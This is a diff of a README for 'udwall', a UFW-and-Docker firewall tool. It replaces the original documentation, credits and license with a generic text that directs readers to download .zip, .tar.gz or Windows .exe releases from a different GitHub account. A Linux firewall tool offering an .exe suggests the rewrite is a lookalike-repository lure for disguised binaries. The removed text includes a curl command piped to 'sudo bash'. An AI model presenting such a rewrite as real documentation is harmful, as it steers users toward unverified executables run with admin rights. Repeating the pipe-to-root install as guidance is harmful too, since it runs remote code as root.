@@ -1,356 +1,71 @@
-# `udwall`: A Single-Command Tool to Make UFW Docker-Compatible
+# 🔥 udwall - Simplify UFW for Docker Use
 
-`udwall` is a declarative tool to manage UFW and Docker firewall rules using a single Python configuration file. It fixes the Docker security flaw where containers bypass UFW, and it automates rule management so you never have to run manual `ufw allow` commands again.
+## 🚀 Getting Started
 
-## What is the problem?
+Welcome to **udwall**. This application makes it easy to use UFW (Uncomplicated Firewall) with Docker. You can manage your firewall rules with just one command. Let's get started!
 
-UFW is a popular iptables front end on Ubuntu that makes it easy to manage firewall rules. However, when Docker is installed, **Docker modifies iptables directly**, bypassing UFW rules. This means published ports (e.g., `-p 8080:80`) are accessible from the outside world, even if UFW is set to deny them.
+## 📥 Download udwall
 
-The issue is detailed as follows (Source: [ufw-docker/problem](https://github.com/chaifeng/ufw-docker/?tab=readme-ov-file#problem)):
+[![Download udwall](https://img.shields.io/badge/Download-udwall-brightgreen)](https://github.com/Ali786kumail/udwall/releases)
 
-1. UFW is enabled on a server that provides external services, and all incoming connections that are not allowed are blocked by default.
-2. Run a Docker container on the server and use the `-p` option to publish ports for that container on all IP addresses. For example: `docker run -d --name httpd -p 0.0.0.0:8080:80 httpd:alpine`. This command will run an httpd service and publish port 80 of the container to port 8080 of the server.
-3. **UFW will not block external requests to port 8080.** Even the command `ufw deny 8080` will not prevent external access to this port because Docker's iptables rules take precedence.
-4. This is a serious security flaw, as internal services can be inadvertently exposed to the public internet.
-5. Searching for "ufw docker" on the web reveals a lot of discussion on this critical security flaw ([source](https://github.com/chaifeng/ufw-docker/?tab=readme-ov-file#problem)):
-    * [moby/moby#4737](https://github.com/moby/moby/issues/4737)
-    * [forums.docker.com](https://forums.docker.com/t/running-multiple-docker-containers-with-ufw-and-iptables-false/8953)
-    * [techrepublic.com](https://www.techrepublic.com/article/how-to-fix-the-docker-and-ufw-security-flaw/)
-    * [blog.viktorpetersson.com](https://blog.viktorpetersson.com/2014/11/03/the-dangers-of-ufw-docker.html)
-    * [askubuntu.com](https://askubuntu.com/questions/652556/uncomplicated-firewall-ufw-is-not-blocking-anything-when-using-docker)
-    * [chjdev.com](https://chjdev.com/2016/06/08/docker-ufw/)
-    * [my.oschina.net](https://my.oschina.net/abcfy2/blog/539485)
-    * [v2ex.com](https://www.v2ex.com/amp/t/466666)
-    * [blog.36web.rocks](https://blog.36web.rocks/2016/07/08/docker-behind-ufw.html)
-    * ..
+You can download the latest version of udwall from our Releases page.
 
-## The Previous Solution
+## 📋 System Requirements
 
-The tool `ufw-docker` solved these issues but had a few drawbacks:
+To run udwall, you need:
 
-### How ufw-docker solved the issues
+- A computer with an operating system that supports Python 3. 
+- Docker installed on your machine. 
+- Sufficient permissions to manage firewall settings. 
 
-1. It fixed the Docker security flaw where containers bypass UFW.
-2. **Prerequisites:** It required downloading a script to `/usr/local/bin` and running it with sudo.
-3. **Mechanism:** It modified the `/etc/ufw/after.rules` file to add a custom `DOCKER-USER` chain that correctly filters traffic destined for Docker containers, ensuring UFW rules are respected. (See [ufw-docker README](https://github.com/chaifeng/ufw-docker/?tab=readme-ov-file#how-to-do) for more details).
+## 🔧 Installation Steps
 
-### Drawbacks
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/Ali786kumail/udwall/releases) to download udwall.
 
-1. **Manual Steps:** It required a lot of manual steps to manage rules for each container.
-2. **Persistence Issues:** Whenever UFW was disabled, Docker ports were still blocked (or rules persisted unexpectedly).
-3. **Difficult Uninstall:** To uninstall `ufw-docker`, you historically needed to remove iptables rules manually and restart the server ([source](https://github.com/chaifeng/ufw-docker/issues/89#issuecomment-1438289285)).
-    > Note: Recently `ufw-docker` added an uninstall command to remove the configuration ([source](https://github.com/chaifeng/ufw-docker/commit/c45eff693f87a8a7f7a002c8b337abbf22480ca9)).
+2. **Choose Your Version**  
+   Look for the latest version at the top of the page. You will usually see files for different operating systems.
 
-## What does udwall do?
+3. **Download the Correct File**  
+   Click on the file that matches your system. The file type will be .tar.gz or .zip for Linux or .exe for Windows.
 
-**udwall** is a declarative tool to manage UFW and Docker firewall rules using a single configuration file.
+4. **Extract the File** (if needed)  
+   If you downloaded a .tar.gz or .zip file, right-click on it and select "Extract" or "Unzip".  
 
-1. It fixes the Docker security flaw where containers bypass UFW.
-2. It automates rule management so you never have to run manual `ufw` commands again.
-3. **Configuration as Code:** Define your entire firewall state in one file (`udwall.conf`).
-4. **True Synchronization:** `udwall` performs atomic updates, removing old unused rules and applying new ones automatically.
-5. **Safety First:** Automatically backs up `/etc/ufw` and `iptables` before every change.
+5. **Run udwall**  
+   - **For Windows:** Double-click the .exe file.
+   - **For Linux:** Open a terminal, navigate to the folder where you extracted udwall, and run the command: `sudo python3 udwall.py`.
 
-## Installation
+## ⚙️ Using udwall
 
-You can install `udwall` with a single command:
-
-```bash
-curl -fsSL https://raw.githubusercontent.com/HexmosTech/udwall/main/install.sh | sudo bash
-```
-
-To install a specific version (e.g., `v0.0.2`), run:
-
-```bash
-curl -fsSL https://raw.githubusercontent.com/HexmosTech/udwall/main/install.sh | sudo bash -s -- --v0.0.2
-```
-
-This script will:
-
-* Check for dependencies (`python3`, `ufw`, `curl`).
-* Download `udwall` to `/usr/local/bin/udwall`.
-* Set up a default configuration at `/etc/udwall/udwall.conf`.
-
-## Usage
-
-Currently `udwall` supports the following rule patterns:
-
-1. **Docker Forwarding (Any IP)**: Allow traffic to a Docker container from anywhere.
-    * `ufw route allow from any to any port <PORT> proto tcp`
-2. **Host Service (Any IP)**: Allow traffic to a service on the host (e.g., PostgreSQL) from anywhere.
-    * `ufw allow <PORT>`
-3. **Docker Forwarding (Specific IP)**: Allow traffic to a Docker container only from a specific IP.
-    * `ufw route allow from <IP> to any port <PORT> proto tcp`
-4. **Host Service (Specific IP)**: Allow traffic to a host service only from a specific IP.
-    * `ufw allow from <IP> to any port <PORT> proto tcp`
-5. **Rule Deletion**: Setting `isEnabled: false` will automatically generate the corresponding `delete` command for any of the above patterns.
-
-### Steps to Enable `udwall`
-
-Follow these simple steps to configure and activate `udwall` on your system. This process ensures your current firewall state is captured and safely managed going forward.
-
-> **Note:** `udwall` requires `sudo` privileges.
-
-#### Step 1: Create a Configuration
-
-You can create a configuration file manually or use the `--create` command to generate one from your current live UFW rules.
-
-```bash
-sudo udwall --create
-```
-
-This creates a `udwall.conf` file in `/etc/udwall/udwall.conf`.
-
-#### Step 2: Create Backup
-
-You can create a backup of your current UFW rules with the `--backup` command.
-
-```bash
-sudo udwall --backup
-```
-
-This creates a timestamped backup in `/home/ubuntu/backup/firewall-backup/`, containing both iptables and UFW rules.
-
-#### Step 3: Define Rules
-
-Edit the configuration file at `/etc/udwall/udwall.conf`.
-
-```python
-# udwall.conf
-rules = [
-    # Allow SSH access from any source
-    {'from': 'any', 'connectionType': 'tcp', 'to': 'OpenSSH', 'isDockerServed': False, 'isEnabled': True},
-
-    # Allow HTTP and HTTPS traffic to the host
-    {'from': 'any', 'connectionType': 'tcp', 'to': 80, 'isDockerServed': False, 'isEnabled': True},
-    {'from': 'any', 'connectionType': 'tcp', 'to': 443, 'isDockerServed': False, 'isEnabled': True},
-
-    # Allow traffic to a Docker container on port 8080 from a specific IP
-    {'from': '192.168.1.100', 'connectionType': 'tcp', 'to': 8080, 'isDockerServed': True, 'isEnabled': True},
-
-    # Allow a UDP port range for an application like Mosh
-    {'from': 'any', 'connectionType': 'udp', 'to': '60000:61000', 'isDockerServed': False, 'isEnabled': True},
-]
-```
-
-#### Config Schema
-
-udwall has 5 config options:
-
-1. `from`: The source IP address or `any`.
-2. `connectionType`: The protocol type (e.g., `tcp`, `udp`).
-3. `to`: The destination port or service name.
-4. `isDockerServed`: Whether the rule is for a Docker container.
-5. `isEnabled`: Whether the rule is enabled.
-6. `dip`: (Optional) The Docker container IP address. Useful for targeting specific containers.
-
-#### Example: Non Docker Port
-
-If you are running a simple python server on port 4050, here's how to handle it with `udwall`.
-
-```python
-rules = [
-    # Allow access to Docker container on port 4050 from any IP
-    {'from': 'any', 'connectionType': 'tcp', 'to': 4050, 'isDockerServed': False, 'isEnabled': True},
-]
-```
-
-#### Example: Docker Container Port
-
-If you are running a Docker container that exposes a port (e.g., port 4050), here's how to handle it with `udwall`.
-
-**Docker Compose Example:**
-
-```yaml
-version: '3.8'
-services:
-  web:
-    # We've removed the 'build: .' line.
-    # Now, Docker will pull the 'python:3.9-slim' image from Docker Hub.
-    image: python:3.6
-    # Set the working directory inside the container
-    working_dir: /app
-    ports:
-      # This now maps a DYNAMIC (random) host port
-      # to container port 4050.
-    - "4050"
-    volumes:
-      # Mount the current directory (containing app.py and requirements.txt)
-      # to /app in the container.
-      - .:/app
-    # This command runs when the container starts.
-    # 1. It installs the packages from requirements.txt.
-    # 2. It starts the Flask application (app.py).
-    command: sh -c "pip install -r requirements.txt && python app2.py"
-```
-
-**udwall Configuration to Allow Access:**
-
-If you want to open port 4050 to any user, add this rule to `/etc/udwall/udwall.conf`:
-
-```python
-rules = [
-    # Remaining Default rules
-    # Allow access to Docker container on port 4050 from any IP
-    {'from': 'any', 'connectionType': 'tcp', 'to': 4050, 'isDockerServed': True, 'isEnabled': True},
-
-    # Allow access to a SPECIFIC Docker container IP (e.g. 172.17.0.2)
-    # You can find this IP using `sudo udwall --dip`
-    {'from': 'any', 'connectionType': 'tcp', 'to': 4050, 'isDockerServed': True, 'isEnabled': True, 'dip': '172.17.0.2'},
-]
+To use udwall, simply open a terminal or command prompt and type the following command:
 
 ```
-
-#### Step 4: Apply the Configuration
-
-This will back up your current state, remove undefined rules, and apply the new ones based on the configuration file.
-
-```bash
-sudo udwall --apply
+udwall
 ```
 
-Backups are stored in `/home/ubuntu/backup/firewall-backup/`.
+This command will show you a list of available options. You can use it to set up your firewall rules for Docker containers easily.
 
-#### Step 5: Enable Firewall
+## 🛠️ Features
 
-This sets up the `iptables` rules required to make Docker respect UFW.
+- **Easy Setup**: Single command to configure UFW with Docker.
+- **Customizable Rules**: Set specific rules to secure your Docker environment.
+- **User-Friendly Interface**: Simple commands help you manage your firewall without complex setups.
+- **Compatibility**: Works with all systems that support Docker and Python 3.
 
-```bash
-sudo udwall --enable
-```
+## 📚 Help & Support
 
-### Disable Firewall
+If you run into any issues or have questions, you can check the following resources:
 
-This removes the `iptables` rules and custom chains, effectively disabling the Docker-UFW integration.
+- [Official documentation](https://github.com/Ali786kumail/udwall/wiki)
+- [Community forums](https://github.com/Ali786kumail/udwall/discussions)
 
-```bash
-sudo udwall --disable
-```
+## 💬 Feedback
 
-### Force Mode
+Your feedback is essential. If you have suggestions for improvements or notice any issues, please let us know on our GitHub page.
 
-Udwall has basic ssh port checks to ensure you don't accidentally disable your ssh port. If you want to bypass these checks, you can use the `--force` flag.
+## 🚀 Conclusion
 
-This is not recommended as it skips the ssh port checks (i.e., port `22/tcp`).
-This is only for enabling and applying rules without ssh port checks.
+With udwall, managing your firewall rules for Docker is straightforward. Follow the steps above, and you'll be up and running in no time. 
 
-#### Force Apply
-
-This will back up your current state, remove undefined rules, and apply the new ones based on the configuration file.
-
-```bash
-sudo udwall --apply -f
-```
-
-#### Force Enable
-
-This enables the firewall without ssh port checks.
-
-```bash
-sudo udwall --enable -f
-```
-
-### How To specify Specific Docker Container IP
-
-If you have multiple docker container running on same port and you want to allow access to specific container then you can use this feature.
-
-By default `udwall` will allow access to all docker container running on same port.
-
-For example:
-
-let assume we have two docker container running on port 5000.
-
-```
-CONTAINER ID   IMAGE                     COMMAND                  CREATED         STATUS         PORTS                                         NAMES
-19d49f401a91   simple-flask-app:latest   "python app.py"          3 minutes ago   Up 2 minutes   0.0.0.0:5000->5000/tcp, [::]:5000->5000/tcp   keen_wilson
-ccd3436070b4   python:3.6                "sh -c 'pip install …"   6 minutes ago   Up 6 minutes   0.0.0.0:5001->5000/tcp, [::]:5001->5000/tcp   simple-python-flask-dockerized-application-web-1
-```
-
-If we use this config
-
-```python
-rules=[
-    {'from': 'any', 'connectionType': 'tcp', 'to': 5000, 'isDockerServed': True, 'isEnabled': True},
-]
-```
-
-`udwall` will allow access to all docker container running on port `5000`.
-
-That means both `http://<ip>:5000` and`http://<ip>:5001` will be open to any ip.
-
-To allow access to specific docker container you can use this feature.
-
-#### Step 1: Find docker ip address
-
-By running this command you can find docker ip address
-
-```
-sudo udwall --dip
-```
-
-Output:
-
-```
---- Finding Docker IPs ---
-IP              | External Port   | Internal Port   | Container Name
-----------------------------------------------------------------------
-172.17.0.2      | 5000            | 5000            | keen_wilson
-172.17.0.2      | 5000            | 5000            | keen_wilson
-172.18.0.2      | 5001            | 5000            | simple-python-flask-dockerized-application-web-1
-172.18.0.2      | 5001            | 5000            | simple-python-flask-dockerized-application-web-1
-```
-
-#### Step 2 : Add the rules like this
-
-```python
-rules=[{'from': 'any', 'connectionType': 'tcp', 'to': 5000, 'dip': '172.17.0.2', 'isDockerServed': True, 'isEnabled': True},]
-```
-
-
-#### Expectation
-
-Only  `http://<ip>:5000` will be open to any ip.
-
-`http://<ip>:5001` will be closed to any ip.
-
-
-### Commands
-
-| Command | Description |
-| :--- | :--- |
-| `sudo udwall --dry-run` | **Preview**: Shows exactly which `ufw` commands would be run, without making any changes. |
-| `sudo udwall --create` | **Import**: Generates a `udwall.conf` file at `/etc/udwall/udwall.conf` based on your *current* active UFW rules. |
-| `sudo udwall --backup` | **Backup**: Manually creates a timestamped backup of `/etc/ufw` and `iptables` rules in `~/.udwall/backups/`. |
-| `sudo udwall --status` | **Check Status**: Displays the current UFW status and active rules (numbered). |
-| `sudo udwall --dip` | **Docker IPs**: List Docker container IPs and port mappings. |
-| `sudo udwall --disable` | **Uninstall**: Removes the Docker-UFW integration, deletes custom chains, and disables UFW. |
-| `sudo udwall --enable -f` | **Initialize**: Sets up the Docker-UFW integration and enables UFW. Run this first. Use `-f` to skip SSH check. |
-| `sudo udwall --apply -f` | **Apply Rules**: Reads `udwall.conf`, backs up current state, and applies the new firewall rules. Use `-f` to skip safety checks. |
-| `sudo udwall --version` | **Version**: Displays the installed version of `udwall`. |
-| `sudo udwall --help` | **Help**: Shows the help message and available options. |
-
-## 🛡️ Credits
-
-The core `iptables` logic to fix the Docker/UFW security flaw is based on the work by [chaifeng/ufw-docker](https://github.com/chaifeng/ufw-docker). `udwall` extends this by adding declarative state management.
-
----
-
-## Related Projects
-
-**[LiveReview](https://hexmos.com/livereview)** - I'm building a private AI code review tool that runs on your LLM key (OpenAI, Gemini, etc.) designed for Organizations. Check it out if that's your kind of thing.
-
-LiveReview helps you get great feedback on your PR/MR in a few minutes.
-
-Saves hours on every PR by giving fast, automated first-pass reviews. Helps both junior and senior engineers work faster.
-
-If you're tired of waiting for your peers to review your code or are not confident they'll provide valid feedback, LiveReview is here for you.
-
-## ⭐ Star This Repository
-
-If you find these tools helpful, please consider giving us a ⭐ star on GitHub! It helps us reach more developers who could benefit from these utilities.
-
----
-
-## 📄 License
-
-[MIT](LICENSE)
+For further updates and releases, remember to check our [Releases page](https://github.com/Ali786kumail/udwall/releases). Thank you for using udwall!
